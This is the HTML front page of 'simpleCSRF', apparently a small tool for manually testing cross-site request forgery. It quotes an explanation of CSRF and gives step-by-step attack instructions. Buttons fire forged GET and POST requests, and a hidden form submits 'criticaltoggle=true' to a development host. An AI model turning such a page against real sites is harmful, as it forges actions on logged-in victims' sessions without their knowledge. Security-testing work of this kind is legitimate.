<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>simpleCSRF</title>
    <link rel="stylesheet" href="css/foundation.css" />    
	<script src="index.js"></script> 
  </head>
  <body>
    
	<div class="row">
      <div class="large-12 columns">
        <header>
			<h1>simpleCSRF</h1>
			<p>manual CSRF made simple</p>
		</header>
      </div>
    </div>
	
	<hr>
    
    <div class="row">
      <div class="large-6 columns">
		<div class="panel">
			<h3>What is a Cross Site Forgery Request?</h3>
			<blockquote>
				<p>CSRF is the practice of tricking the user into inadvertently issuing an HTTP request to one of these sites without their knowledge, usually with malicious intent. This attack pattern is known as the <a href="http://en.wikipedia.org/wiki/Confused_Deputy">confused deputy problem</a> as it’s fooling the user into misusing their authority.</p>
				<p>A CSRF attack forces a logged-on victim’s browser to send a forged HTTP request, including the victim’s session cookie and any other automatically included authentication information, to a vulnerable web application. This allows the attacker to force the victim’s browser to generate requests the vulnerable application thinks are legitimate requests from the victim.</p>
				<cite>Troy Hunt, <a href="http://www.troyhunt.com/2010/11/owasp-top-10-for-net-developers-part-5.html">http://www.troyhunt.com</a></cite>
			</blockquote>
		</div>
      </div>
	  <div class="large-6 columns">
	  	<div class="panel">
	  		<h3>Instructions</h3>
	  		<p>To execute a CSRF attack, you will need to be logged in to the target website in a separate tab. Once that's done...</p>
			<ol>
	  			<li>Define the base URL (no parameters).</li>
	  			<li>Add parameters (must be added in the order expected by the endpoint).</li>
	  			<li>Execute your choice of CSRF attacks.</li>
	  			<li>???</li>
	  			<li>Profit.  And verify that something naughty happened.</li>
	  		</ol>
	  	</div>
	  </div>
    </div>	
	<button onclick="imgTest()">imgTest()</button>
	<button onclick="csrf('GET','http://dev.sbelyea.net')">csrf('GET','http://dev.sbelyea.net')</button>
	<button onclick="csrf('POST','http://dev.sbelyea.net')">csrf('POST','http://dev.sbelyea.net')</button>

	<form method='POST' action='http://dev.sbelyea.net' target="csrf-frame" id="csrf-form" hidden>
		<input type='hidden' name='criticaltoggle' value='true'>
		<input type='submit' value='submit'>
	</form>
	
  </body>
</html>

<!--
dev notes

	- What inputs should be present for this?
		method (GET or POST)
		URL
		key:value pairs (for parameters), in order; add/remove functionality	
		
	- Start w/ just form submission
-->
